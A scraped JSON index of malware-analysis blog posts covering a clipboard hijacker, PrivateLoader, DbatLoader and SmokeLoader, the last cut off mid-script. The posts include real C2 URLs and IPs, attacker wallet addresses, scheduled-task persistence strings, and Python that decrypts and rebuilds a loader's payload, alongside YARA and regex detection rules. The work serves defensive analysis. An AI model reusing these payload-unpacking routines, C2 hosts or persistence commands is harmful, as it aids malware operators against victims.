&#39;mirrow&#39;, &#39;settings&#39;, &#39;collect&#39;, &#39;options&#39;, &#39;value&#39;, &#39;manager&#39;, &#39;page&#39;, &#39;control&#39;, &#39;thread&#39;, &#39;operator&#39;, &#39;byte&#39;, &#39;char&#39;, &#39;return&#39;, &#39;device&#39;, &#39;driver&#39;, &#39;tool&#39;, &#39;sheet&#39;, &#39;util&#39;, &#39;book&#39;, &#39;class&#39;, &#39;window&#39;, &#39;handler&#39;, &#39;pack&#39;, &#39;virtual&#39;, &#39;test&#39;, &#39;active&#39;, &#39;collision&#39;, &#39;process&#39;, &#39;make&#39;, &#39;local&#39;, &#39;core&#39;]} . hex(struct.unpack(&#39;&lt;I&#39;,b&#39; x89j xc0 xd8&#39;)[0]) . &#39;0xd8c06a89&#39; . TODO: Parse each of the config values individually .",
            "url": "https://research.openanalysis.net/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.html",
            "relUrl": "/config/python/yara/isfb/rm3/gozi/2022/10/06/isfb.html",
            "date": " ‚Ä¢ Oct 6, 2022"
        }
        
    
  
    
        ,"post37": {
            "title": "Clipboard Hijacker Detection",
            "content": ". Overview . In general clipboard hijackers are used to monitor clipboard activity on a target host, and swap valuable data like BTC addresses. We would like a generic static method for detecting this behaviour. . Samples . 8d7f0e6b6877bdfb9f4531afafd0451f7d17f0ac24e2f2427e9b4ecc5452b9f0 Malshare | . Analysis . Mutex: M5/610HP/STAGE2 . Copies itself to %APPDATA% Microsoft Network mstsca.exe . Uses scheduled task to run newly copied malware with a 1 min delay. . Watches clipboard and replaces wallet strings. . Pulling hard coded coind addresses . import re def get_unicode_strings(buf, n=4): ASCII_BYTE = b&#39; ! &quot;# $%&amp; &#39; ( ) * +,- ./0123456789:;&lt;=&gt; ?@ABCDEFGHIJKLMNOPQRSTUVWXYZ [ ] ^_`abcdefghijklmnopqrstuvwxyz { | } ~ t&#39; if type(buf) == str: buf = buf.encode(&#39;utf-8&#39;) reg = b&#39;((?:[%s] x00){%d,})&#39; % (ASCII_BYTE, n) uni_re = re.compile(reg) out = [] for match in uni_re.finditer(buf): try: out.append(match.group().decode(&quot;utf-16&quot;)) except UnicodeDecodeError: pass return out coin_eggs = { &quot;btc&quot;: &quot;[13][a-km-zA-HJ-NP-Z1-9]{25,34}&quot;, &quot;bch&quot;: &quot;((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}&quot;, &quot;eth&quot;: &quot;0x[a-fA-F0-9]{40}&quot;, &quot;ltc&quot;: &quot;[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}&quot;, &quot;doge&quot;: &quot;D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}&quot;, &quot;dash&quot;: &quot;X[1-9A-HJ-NP-Za-km-z]{33}&quot;, &quot;xmr&quot;: &quot;4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}&quot;, &quot;neo&quot;: &quot;A[0-9a-zA-Z]{33}&quot;, &quot;xrp&quot;: &quot;r[0-9a-zA-Z]{33}&quot;} coin_eggs2 = { &quot;bitcoin&quot;: r&quot;[13][a-km-zA-HJ-NP-Z1-9]{25,34}&quot;, &quot;bech32&quot;: r&quot;bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})&quot;, &quot;bitcoin_cash&quot;: r&quot;[13][a-km-zA-HJ-NP-Z1-9]{33}&quot;, &quot;dash&quot;: r&quot;X[1-9A-HJ-NP-Za-km-z]{33}&quot;, &quot;ethereum&quot;: r&quot;0x[a-fA-F0-9]{40}$&quot;, &quot;litecoin&quot;: r&quot;[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}&quot;, &quot;monero&quot;: r&quot;4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$&quot;} file_data = open(&#39;/tmp/8d7f0e6b6877bdfb9f4531afafd0451f7d17f0ac24e2f2427e9b4ecc5452b9f0.bin&#39;,&#39;rb&#39;).read() u_strings = get_unicode_strings(file_data) for u_string in u_strings: for coin_name in coin_eggs.keys(): coin_egg = coin_eggs[coin_name] m = re.match(coin_egg, u_string) if m: print(f&quot;{coin_name}: {m.group()}&quot;) coin_eggs2 = { &quot;bitcoin&quot;: r&quot;[13][a-km-zA-HJ-NP-Z1-9]{25,34}&quot;, &quot;bech32&quot;: r&quot;bc(0([ac-hj-np-z02-9]{39}|[ac-hj-np-z02-9]{59})|1[ac-hj-np-z02-9]{8,87})&quot;, &quot;bitcoin_cash&quot;: r&quot;[13][a-km-zA-HJ-NP-Z1-9]{33}&quot;, &quot;dash&quot;: r&quot;X[1-9A-HJ-NP-Za-km-z]{33}&quot;, &quot;ethereum&quot;: r&quot;0x[a-fA-F0-9]{40}$&quot;, &quot;litecoin&quot;: r&quot;[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}&quot;, &quot;monero&quot;: r&quot;4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$&quot;} print(&quot; nTry 2 n&quot;) for u_string in u_strings: for coin_name in coin_eggs2.keys(): coin_egg = coin_eggs2[coin_name] m = re.match(coin_egg, u_string) if m: print(f&quot;{coin_name}: {m.group()}&quot;) . btc: 1My2QNmVqkvN5M13xk8DWftjwC9G1F2w8Z btc: 3NLzE3tXwoagBrgFsjNNkPZfrESydTD8JP ltc: 3NLzE3tXwoagBrgFsjNNkPZfrESydTD8JP ltc: LLiNjWA9h4LxVtDigLQ79xQdGiJYC4oHis ltc: MBD2C8QV7RDrNtSDRe9B2iH5r7yH4iMcxk eth: 0xa6360e294DfCe4fE4Edf61b170c76770691aA111 xmr: 42UxohbdHGMYGPvW5Uep45Jt9Rj2WvTV958B5G5vHnawZhA4UwoD53Tafn6GRmcGdoSFUfCQN6Xm37LBZZ6qNBorFw3b6s2 doge: DBbgRYaKG993LFJKCWz73PZqveWsnwRmGc neo: Ae2tdPwUPEZDqNhACJ3ZT5NdVjkNffGAwa Try 2 bitcoin: 1My2QNmVqkvN5M13xk8DWftjwC9G1F2w8Z bitcoin_cash: 1My2QNmVqkvN5M13xk8DWftjwC9G1F2w8Z bitcoin: 3NLzE3tXwoagBrgFsjNNkPZfrESydTD8JP bitcoin_cash: 3NLzE3tXwoagBrgFsjNNkPZfrESydTD8JP litecoin: 3NLzE3tXwoagBrgFsjNNkPZfrESydTD8JP bech32: bc1qx8vykfse9s9llguez9cuyjmy092yeqkesl2r5v litecoin: LLiNjWA9h4LxVtDigLQ79xQdGiJYC4oHis litecoin: MBD2C8QV7RDrNtSDRe9B2iH5r7yH4iMcxk ethereum: 0xa6360e294DfCe4fE4Edf61b170c76770691aA111 monero: 42UxohbdHGMYGPvW5Uep45Jt9Rj2WvTV958B5G5vHnawZhA4UwoD53Tafn6GRmcGdoSFUfCQN6Xm37LBZZ6qNBorFw3b6s2 . Yara Rule . First we can take a look at how they parse out the coin addresses from the clipboard. . General Check . text:004014B1 6A 30 push 30h ; &#39;0&#39; ; wMatch .text:004014B3 56 push esi ; pszStart .text:004014B4 FF 15 18 40 40 00 call StrChrW .text:004014BA 85 C0 test eax, eax .text:004014BC 0F 85 83 00 00 00 jnz loc_401545 .text:004014C2 6A 4F push 4Fh ; &#39;O&#39; ; wMatch .text:004014C4 56 push esi ; pszStart .text:004014C5 FF 15 18 40 40 00 call StrChrW .text:004014CB 85 C0 test eax, eax .text:004014CD 75 76 jnz short loc_401545 .text:004014CF 6A 49 push 49h ; &#39;I&#39; ; wMatch .text:004014D1 56 push esi ; pszStart .text:004014D2 FF 15 18 40 40 00 call StrChrW .text:004014D8 85 C0 test eax, eax .text:004014DA 75 69 jnz short loc_401545 . BTC Check . cmp eax, 2Ah ; &#39;*&#39; .text:004015C3 75 5B jnz short loc_401620 .text:004015C5 66 39 1E cmp [esi], bx .text:004015C8 75 56 jnz short loc_401620 .text:004015CA 66 39 4E 02 cmp [esi+2], cx .text:004015CE 75 50 jnz short loc_401620 .text:004015D0 6A 31 push 31h ; &#39;1&#39; .text:004015D2 58 pop eax .text:004015D3 66 39 46 04 cmp [esi+4], ax .text:004015D7 75 47 jnz short loc_401620 .text:004015D9 6A 4F push 4Fh ; &#39;O&#39; ; wMatch .text:004015DB 8D 5E 06 lea ebx, [esi+6] .text:004015DE 53 push ebx ; pszStart .text:004015DF FF 15 18 40 40 00 call StrChrW .text:004015E5 85 C0 test eax, eax .text:004015E7 75 34 jnz short loc_40161D .text:004015E9 6A 49 push 49h ; &#39;I&#39; ; wMatch .text:004015EB 53 push ebx ; pszStart .text:004015EC FF 15 18 40 40 00 call StrChrW .text:004015F2 85 C0 test eax, eax .text:004015F4 75 27 jnz short loc_40161D . rule $ btc_find = {6A 31 [4-16] 75 ?? 6A 4F [4-16] 75 ?? 6A 49} . https://riskmitigation.ch/yara-scan/ . rule clipboard_hijack { meta: description = &quot;Identifies clipboard hijacking&quot; strings: $btc_find = {6A 31 [4-16] 75 ?? 6A 4F [4-16] 75 ?? 6A 49} $coin_find = {6A 30 [4-16] 75 ?? 6A 4F [4-16] 75 ?? 6A 49} $s1 = &quot;GetClipboardData&quot; ascii wide $s2 = &quot;SetClipboardData&quot; ascii wide condition: all of them } .",
            "url": "https://research.openanalysis.net/clipboard/hijacker/yara/triage/2022/09/18/clipboard-hijacker.html",
            "relUrl": "/clipboard/hijacker/yara/triage/2022/09/18/clipboard-hijacker.html",
            "date": " ‚Ä¢ Sep 18, 2022"
        }
        
    
  
    
        ,"post38": {
            "title": "PrivateLoader Triage",
            "content": "Overview . Private Loader is a pay-per-install (PPI) malware that is used to download and execute... more malware! There are there is a loader component and a main component, both written in C++. . Samples . Unpacked 1aa2d32ab883de5d4097a6d4fe7718a401f68ce95e0d2aea63212dd905103948 malshare | Zscaler analysis aa2c0a9e34f9fa4cbf1780d757cc84f32a8bd005142012e91a6888167f80f4d5 | . References . Peeking into PrivateLoader | IcedID leverages PrivateLoader | Tracking PrivateLoader: Malware Distribution Service | Hunting PrivateLoader: Pay-Per-Install Service | PrivateLoader: The first step in many malware schemes | PrivateLoader to Anubis Loader | . String Decryption . There are encrypted stack strings that are composed of the string data, and an accompanying XOR key. These are loaded onto the stack, then directly XOR decrypted. . X-Junior IDA Script . X-Junior has a script that we can try in IDA to decrypt these strings: GitHub Repo. . Andre Tavares Python Script . andretavare5 has a python script using capstone to decrypt the strings: Script Gist. . We have created our own hybrid of the two, which uses capstone for disassembly, but implements the logic from the IDA script... . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) def tohex(data): import binascii if type(data) == str: return binascii.hexlify(data.encode(&#39;utf-8&#39;)) else: return binascii.hexlify(data) . import pefile import struct from capstone import * from capstone.x86 import * SAMPLE_PATH = &#39;/tmp/private.bin&#39; def is_ascii(s): return all(c &lt; 128 or c == 0 for c in s) def get_data(instructions): data_chunks = [] count = 0 steps = 0 steps_flag = 0 flag_reg = 0 search_count = 0 search_limit = 400 for inst in instructions: steps +=1 if search_count &gt; search_limit: break search_count += 1 if inst.mnemonic == &#39;call&#39;: break if inst.mnemonic == &#39;mov&#39; and inst.operands[0].type == X86_OP_REG and inst.operands[1].type == X86_OP_IMM: flag_reg = 1 if inst.mnemonic == &#39;mov&#39; and ( (inst.operands[0].type == X86_OP_MEM and inst.operands[0].value.mem.disp != 0) or inst.operands[0].type == X86_OP_REG ) and inst.operands[1].type == X86_OP_IMM: imm_value = inst.operands[1].value.imm #print(hex(imm_value)) if imm_value &amp; 0xff000000 == 0: break data_chunk = struct.pack(&#39;&lt;I&#39;,imm_value) data_chunks.append(data_chunk) count += 1 steps = 0 steps_flag = 1 if steps == 16 and steps_flag: break #if steps == 6 and steps_flag: # if you got some garbage string use this instead of the above #break enc_data = data_chunks[0:count//2][::-1] key = data_chunks[count//2:count][::-1] if flag_reg : enc_data = sum(zip(enc_data[1::2], enc_data[::2]), ()) key = sum(zip(key[1::2], key[::2]), ()) return b&#39;&#39;.join(enc_data),b&#39;&#39;.join(key) filename = SAMPLE_PATH # disassemble .txt section pe = pefile.PE(filename) md = Cs(CS_ARCH_X86, CS_MODE_32) md.detail = True addr = 0 instructions = [] txt = pe.sections[0] # TODO: we don&#39;t seem to be disassembling the full section?!! image_base = pe.OPTIONAL_HEADER.ImageBase section_rva = txt.VirtualAddress for inst in md.disasm(txt.get_data(), image_base + section_rva): instructions.append(inst) # search, build and decrypt strings strings = [] addr = None string = &#39;&#39; for i, inst in enumerate(instructions): if inst.mnemonic == &#39;pxor&#39;: #and inst.address == 0x009910F2: #try: # possible string decryption found reversed_instruction_list = instructions[:i][::-1] encrypted_str, key = get_data(reversed_instruction_list) # print(f&quot;str_len: {len(encrypted_str)}, key_len: {len(key)}&quot;) # print(encrypted_str) # print(key) out = bytearray(encrypted_str[j] ^ key[j] for j in range(len(key))) #print(out) out = out.replace(b&#39; x00&#39;,b&#39;&#39;) #print(out.decode(&#39;utf-8&#39;)) if is_ascii(out): strings.append((inst.address,out.decode(&#39;utf-8&#39;))) print(len(strings)) for s in strings: print(f&#39;{hex(s[0])} {s[1]}&#39;) . 122 0x9910f2 0.9 0x993a24 rb 0x99451d %X 0x9947ca Unknown 0x9949a1 SOFTWARE Microsoft Cryptography 0x9949f4 SOFTWARE Microsoft Cryptography 0x994b6e MachineGuid 0x994d62 Unknown 0x994fb5 _ 0x99510a _ 0x995222 _ 0x995edf null 0x9968c1 http://163.123.143.4/proxies.txt 0x996911 http://163.123.143.4/proxies.txt 0x996961 http://163.123.143.4/proxies.txt 0x996c3e :1080 0x996e47 0x997139 :1080 0x9973c5 : 0x9976f3 . 0x997a39 . 0x997ca1 . 0x997e59 . 0x998817 http://107.182.129.251/server.txt 0x99886a http://107.182.129.251/server.txt 0x9988bd http://107.182.129.251/server.txt 0x998a29 HOST: 0x998cc2 : 0x9991fd pastebin.com/raw/A7dSG1te 0x999250 pastebin.com/raw/A7dSG1te 0x9993e5 HOST: 0x99953d HOST: 0x9999f4 http://wfsdragon.ru/api/setStats.php 0x999a44 http://wfsdragon.ru/api/setStats.php 0x999a94 http://wfsdragon.ru/api/setStats.php 0x999f77 HOST: 0x99a20f : 0x99a8e4 softs-portal.com/api/registerUser.php 0x99a937 softs-portal.com/api/registerUser.php 0x99a98a softs-portal.com/api/registerUser.php 0x99ae70 HOST: 0x99b108 : 0x99b52f 163.123.143.12 0x99b9d1 telegram.org 0x99bb06 twitter.com 0x99bc38 yandex.ru 0x99bd76 google.com 0x99c4d7 data= 0x99c79a /service/communication.php 0x99c7ea /service/communication.php 0x99c8f3 http:// 0x99d561 ipinfo.io/widget 0x99d5b4 ipinfo.io/widget 0x99d9b4 country 0x99db38 country 0x99dedd db-ip.com 0x99e0fd data-api-key=&#34; 0x99e39a /self 0x99e536 api.db-ip.com/v2/ 0x99e589 api.db-ip.com/v2/ 0x99eb4b countryCode 0x99eccf countryCode 0x99f172 www.maxmind.com/geoip/v2.1/city/me 0x99f1c2 www.maxmind.com/geoip/v2.1/city/me 0x99f212 www.maxmind.com/geoip/v2.1/city/me 0x99f588 country 0x99f70c country 0x99f8a8 country 0x99f9e4 iso_code 0x99fb71 country 0x99fcad iso_code 0x99ff09 GetIP 0x9a008b IP: 0x9a01d5 IP: 0x9a0730 api.ipgeolocation.io/ipgeo?include=hostname&amp;ip= 0x9a0783 api.ipgeolocation.io/ipgeo?include=hostname&amp;ip= 0x9a07d3 api.ipgeolocation.io/ipgeo?include=hostname&amp;ip= 0x9a0b97 country_code2 0x9a0d1b country_code2 0x9a0f78 PowerControl 0x9a1125 PowerControl 0x9a12e9 PowerControl 0x9a16cd PowerControl_Svc.exe 0x9a1720 PowerControl_Svc.exe 0x9a1a79 _old 0x9a1fd6 PowerControl 0x9a21d5 . 0x9a258f Power monitoring service for your device. 0x9a25e2 Power monitoring service for your device. 0x9a2635 Power monitoring service for your device. 0x9a2759 PowerControl 0x9a29a4 WININET.dll 0x9a2ae7 WINHTTP.dll 0x9a2d74 GetVersion| 0x9a2f56 _old 0x9a30bb _old 0x9a32c8 GetUpdateLink 0x9a360b https://vipsofts.xyz/files/mega.bmp 0x9a365e https://vipsofts.xyz/files/mega.bmp 0x9a36b1 https://vipsofts.xyz/files/mega.bmp 0x9a3869 https:// 0x9a3a88 .exe 0x9a3bc2 0x9a417d | 0x9a4295 GetLoaderLink| 0x9a44e3 Later 0x9a46ed https:// 0x9a490c .exe 0x9a4a46 0x9a4f9a open 0x9a5256 &#34; /tn &#34;PowerControl HR&#34; /sc HOURLY /rl HIGHEST 0x9a52a9 &#34; /tn &#34;PowerControl HR&#34; /sc HOURLY /rl HIGHEST 0x9a52fc &#34; /tn &#34;PowerControl HR&#34; /sc HOURLY /rl HIGHEST 0x9a5420 &#34; /tr &#34; 0x9a55e0 schtasks /create /f /RU &#34; 0x9a5633 schtasks /create /f /RU &#34; 0x9a5ba4 &#34; /tn &#34;PowerControl LG&#34; /sc ONLOGON /rl HIGHEST 0x9a5bf7 &#34; /tn &#34;PowerControl LG&#34; /sc ONLOGON /rl HIGHEST 0x9a5c4a &#34; /tn &#34;PowerControl LG&#34; /sc ONLOGON /rl HIGHEST 0x9a5d6e &#34; /tr &#34; 0x9a5f2e schtasks /create /f /RU &#34; 0x9a5f81 schtasks /create /f /RU &#34; .",
            "url": "https://research.openanalysis.net/privateloader/loader/config/triage/2022/09/08/privateloader.html",
            "relUrl": "/privateloader/loader/config/triage/2022/09/08/privateloader.html",
            "date": " ‚Ä¢ Sep 8, 2022"
        }
        
    
  
    
        ,"post39": {
            "title": "DbatLoader Triage",
            "content": "Overview . Dbatloader is a simple loader that is used to download and execute a payload. It is very small and written in delphi. The sample we are looking at is the second? stage, likely the first stages are some sort of document chain. From OSINT we expect that this stage is simply used to download a third stage which will contain the payload as a resource. . Samples . Packed Parent 5be5708b720b520f2292ec10196f47ff3a687843a529540d75c0d7621fad247e malshare | Unpacked payload dc5ec82e7cb2590ae612a2dd7203ae3a81662707377f2be44c94378ef0b0d3b0 malshare | . References . Malpedia Dbatloader Yara | DBatLoader: Abusing Discord to Deliver Warzone RAT | Exploit, steganography and Delphi: unpacking DBatLoader | . Analysis . C2 Extraction . The packed payload actually contains the C2s which are accessed by the unpacked payload. This is done via a hard-coded delimiter in the unpacked child. In our sample there are two identical C2 URLs using the delimters ^^Nc, and Ymo_^. The child will open the parent and search for a string that is sandwiched between the delimiter. Once the string has been extracted it is decrypted using a simple add/mod algorithm with a hard coded number. In our sample the number is 217. . def unhex(hex_string): import binascii if type(hex_string) == str: return binascii.unhexlify(hex_string.encode(&#39;utf-8&#39;)) else: return binascii.unhexlify(hex_string) . c2_data = unhex(&#39;2F 3B 3B 37 3A 01 F6 F6 36 35 2C 2B 39 30 3D 2C F5 33 30 3D 2C F5 2A 36 34 F6 2B 36 3E 35 33 36 28 2B 06 2A 30 2B 04 0C 08 0C 00 F7 F7 00 F8 FB FA 0D FE 0A FB F9 F7 ED 39 2C 3A 30 2B 04 0C 08 0C 00 F7 F7 00 F8 FB FA 0D FE 0A FB F9 F7 EC F9 F8 F8 F9 FE ED 28 3C 3B 2F 32 2C 40 04 08 09 18 09 13 15 21 2D F7 FC 16 11 2F 41 2A E7 E7&#39;.replace(&#39; &#39;,&#39;&#39;)) delim = b&#39;^^Nc&#39; def addit(data, key): out = [] for c in data: out.append((c + (0x112 % key))&amp;0xff) return bytes(out) addit(c2_data,217) . b&#39;https://onedrive.live.com/download?cid=EAE9009143F7C420&amp;resid=EAE9009143F7C420%21127&amp;authkey=ABQBLNZf05OJhzc &#39; . Parsing Downloaded Data . The downloaded data is a complex encrypted structure that must be parsed before the Stage3 binary can be extracted. An ecrypted version of the data can be downloaded from Malshare here: 7fac3d9c98127d11ce69c3130dbbd6a876e1ae37c80304516cc8dd675423b9f2. . The downloaded data is first decrypted ysing a simple add/sub algorithm using the same hard coded key as the C2 decryption routine. In our sample this key was 217. Once decrypted the data is inverted and split using a hard coded delimiter. In our sample the delimiter is is a string starting with *()%@5YT.... . data = open(&#39;/tmp/stage3.bin&#39;, &#39;rb&#39;).read() key = 217 out = [] for c in data: if c &amp; 1 != 0: out.append((c + key) &amp; 0xff) else: out.append((c - key) &amp; 0xff) out = bytes(out) out = out[::-1] delim = b&#39;*()%@5YT!@#G__T@#$%^&amp;*()__#@$#57$#!@&#39; out_sections = out.split(delim) for s in out_sections: print(s[:400]) print(&#39; n n n n&#39;) . b&#39;&#39; b&#39;bqreumlsuncxfylyhjhzefggkpmxwfercbsgqwjfopnjderezbemywzcjzxkjjwfyuaukujqnpoepcjvkmzajzzxtisalfpgvjglattaveih&#39; b&#39;Qfefstpinqstsrgjnrtjyjlfqaxhrds&#39; b&#39; xc9 xda xd9 xce xde xc6 xc7 xd8 xde xc5 xc8 xd3 xcd xd2 xc7 xd2 xc3 xc1 xc3 xd1 xce xcd xcc xcc xc0 xdb xc6 xd3 xdc xcd xce xd9 xc8 xc9 xd8 xcc xda xdc xc1 xcd xc4 xdb xc5 xc1 xcf xce xd9 xce xd1 xc9 xce xc6 xd2 xdc xd1 xc8 xc1 xd1 xd3 xc0 xc1 xc1 xdc xcd xd2 xde xca xde xc0 xde xc1 xda xc5 xdb xc4 xce xdb xc8 xc1 xdd xc0 xc6 xd1 xca xc1 xd1 xd1 xd3 xdf xc2 xd8 xca xc7 xcd xdb xcc xdd xc1 xcc xc7 xca xdf xdf xca xdd xce xc2 xc3 xc9 xda xd9 xce xde xc6 xc7 xd8 xde xc5 xc8 xd3 xcd xd2 xc7 xd2 xc3 xc1 xc3 xd1 xce xcd xcc xcc xc0 xdb xc6 xd3 xdc xcd xce xd9 xc8 xc9 xd8 xcc xda xdc xc1 xcd xc4 xdb xc5 xc1 xcf xce xd9 xce xd1 xc9 xce xc6 xd2 xdc xd1 xc8 xc1 xd1 xd3 xc0 xc1 xc1 xdc xcd xd2 xde xca xde xc0 xde xc1 xda xc5 xdb xc4 xce xdb xc8 xc1 xdd xc0 xc6 xd1 xca xc1 xd1 xd1 xd3 xdf xc2 xd8 xca xc7 xcd xdb xcc xdd xc1 xcc xc7 xca xdf xdf xca xdd xce xc2 xc3 xc9 xda xd9 xce xde xc6 xc7 xd8 xde xc5 xc8 xd3 xcd xd2 xc7 xd2 xc3 xc1 xc3 xd1 xce xcd xcc xcc xc0 xdb xc6 xd3 xdc xcd xce xd9 xc8 xc9 xd8 xcc xda xdc xc1 xcd xc4 xdb xc5 xc1 xcf xce xd9 xce xd1 xc9 xce xc6 xd2 xdc xd1 xc8 xc1 xd1 xd3 xc0 xc1 xc1 xdc xcd xd2 xde xca xde xc0 xde xc1 xda xc5 xdb xc4 xce xdb xc8 xc1 xdd xc0 xc6 xd1 xca xc1 xd1 xd1 xd3 xdf xc2 xd8 xca xc7 xcd xdb xcc xdd xc1 xcc xc7 xca xdf xdf xca xdd xce xc2 xc3 xc9 xda xd9 xce xde xc6 xc7 xd8 xde xc5 xc8 xd3 xcd xd2 xc7 xd2 xc3 xc1 xc3 xd1 xce xcd xcc xcc xc0 xdb xc6 xd3 xdc xcd xce xd9 xc8 xc9 xd8 xcc xda xdc xc1 xcd xc4 xdb xc5 xc1 xcf xce xd9 xce xd1 xc9 xce xc6 xd2 xdc xd1 xc8 xc1 xd1 xd3 xc0 xc1 xc1 xdc xcd xd2 xde xca xde xc0 xde xc1 xda xc5 xdb xc4 xce&#39; b&#39;&#39; b&#39;1&#39; b&#39;&#39; b&#39;1&#39; b&#39;&#39; b&#39;217&#39; . Stage3 Extraction . Once the data has been split into sections the second section is used as a key to decrypt the forth section, which contains the Stage3 payload. In our sample there were 10 sections in total and the first section was skipped entirly and contained no data. The decryption routine is a simple xor with the key, and the key, and data lengths (unusual). . Once the Stage3 payload has been decrypted it is inverted, then decrypted a second time using the same add/mod algorithm that was used to decrypt the C2 URLs. The decryption key is located in the tenth section. In our sample this key matched the hard coded C2 key in Stage2 217. . The decrypted Stage3 payload is then inverted again and passed through a final decryption algorythm that was refered to as decrypt_yak in this blog post and reproduced in Python (our graditute &lt;3). . A decrypted Stage3 payload can be downloaded from Malshare here: 05962419fba7b3b2b2fee77365db12e71d33d2919db5e1c162f2211398b7c8d2 . key = out_sections[1] key_len = len(key) payload_data = out_sections[3] payload_data_len = len(payload_data) out = [] key_count = 0 for i in range(payload_data_len): tmp_byte = (payload_data[i] ^ payload_data_len ) &amp; 0xff out.append((key[key_count] ^ key_len ^ tmp_byte ) &amp; 0xff) key_count = (key_count + 1) % key_len payload_out = bytes(out) payload_out_dec = addit(payload_out, 217) payload_out_dec = payload_out_dec[::-1] def decrypt_yak(data): &quot;&quot;&quot; implements the first decryption layer of function 0x416408 &quot;&quot;&quot; res = bytearray(data) for i, c in enumerate(data): if 0x21 &lt;= c &lt;= 0x7e: res[i] = ((((c + 0xe) % 0x5e) + 0x21) &amp; 0xff) return bytes(res) final_payload = decrypt_yak(payload_out_dec) print(final_payload[:400]) . b&#39;MZP x00 x02 x00 x00 x00 x04 x00 x0f x00 xff xff x00 x00 xb8 x00 x00 x00 x00 x00 x00 x00@ x00 x1a x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x01 x00 x00 xba x10 x00 x0e x1f xb4 t xcd! xb8 x01L xcd! x90 x90This program must be run under Win32 r n$7 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00PE x00 x00L x01 x02 x00 xc0 x1b xc4+ x00 x00 x00 x00 x00 x00 x00 x00 xe0 x00 x8f x81 x0b x01 x04 x00$ x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x17 x15 x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x00 x00S x00 x00 x10 x00 x00 x00 x02 x00 x00 x04 x00 x00 x00 x00 x00 x00 x00 x04 x00 x00 x00 x00 x00 x00 x00 x00P x02 x00 x00 x04 x00 x00 x00 x00 x00 x00 x02 x00 x00 x00 x00 x00 x10 x00 x00 x00 x01 x00 x00 x00 x10 x00 x00 x00 x01 x00 x00 x00 x00 x00 x10 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00@ x02 x00 x00 x02 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00&#39; .",
            "url": "https://research.openanalysis.net/dbatloader/delphi/loader/config/triage/2022/09/04/dbatloader.html",
            "relUrl": "/dbatloader/delphi/loader/config/triage/2022/09/04/dbatloader.html",
            "date": " ‚Ä¢ Sep 4, 2022"
        }
        
    
  
    
        ,"post40": {
            "title": "SmokeLoader Triage",
            "content": "Overview . Samples . Packed parent cef4f5f561b5c481c67e0a9a3dd751d18d696b61c7a5dab5ebb29535093741b4 | Unpacked SmokeLoader 041a05dd902a55029449bf412cedbe59a593f8d4e67d4ae37cf7a928c92f22ca | . SmokeLoader Background . This SmokeLoader sample is on MalwareBazaarand through sandbox runs we know that is was used to download Vidar. From JoeSandbox public report we know we should find the following config in this loader . { &quot;C2 list&quot;: [ &quot;http://piratia.su/tmp/&quot;, &quot;http://piratia-life.ru/tmp/&quot;, &quot;http://diewebseite.at/tmp/&quot;, &quot;http://faktync.com/tmp/&quot;, &quot;http://mupsin.ru/tmp/&quot;, &quot;http://aingular.com/tmp/&quot;, &quot;http://mordo.ru/tmp/&quot; ] } . References . Deep Analysis of SmokeLoader | Historical Changes and Trends (Marcos Alvares) | . Stage 2 . Opaque predicate deobfuscation . From this blog we have a simple jmp fix script. . import idc ea = 0 while True: ea = min(idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, &quot;74 ? 75 ?&quot;), # JZ / JNZ idc.find_binary(ea, idc.SEARCH_NEXT | idc.SEARCH_DOWN, &quot;75 ? 74 ?&quot;)) # JNZ / JZ if ea == idc.BADADDR: break idc.patch_byte(ea, 0xEB) # JMP idc.patch_byte(ea+2, 0x90) # NOP idc.patch_byte(ea+3, 0x90) # NOP `` Once we fix the jmps we need to nop out the junk code between the code to allow IDA to convert this into a function python import idaapi start = 0x00402DDD end = 0x00402EBF ptr = start while ptr &lt;= end: next_ptr = next_head(ptr) junk_bytes = next_ptr - ptr if ida_bytes.get_bytes(ptr, 1) == b&#39; xeb&#39;: idaapi.patch_bytes(ptr, junk_bytes * b&#39; x90&#39;) ptr = next_ptr . Or, we could use this excellent script from @anthonyprintup . import ida_ua import ida_name import ida_bytes def decode_instruction(ea: int) -&gt; ida_ua.insn_t: instruction: ida_ua.insn_t = ida_ua.insn_t() instruction_length = ida_ua.decode_insn(instruction, ea) if not instruction_length: return None return instruction def main(): begin: int = ida_name.get_name_ea(idaapi.BADADDR, &quot;start&quot;) end: int = begin + 0xE2 instructions: dict[int, ida_ua.insn_t] = {} # Undefine the current code ida_bytes.del_items(begin, 0, end) # Follow the control flow and create instructions instruction_ea: int = begin while instruction_ea &lt;= end: if instruction_ea not in instructions.keys(): instruction: ida_ua.insn_t = ida_ua.insn_t() instruction_length: int = 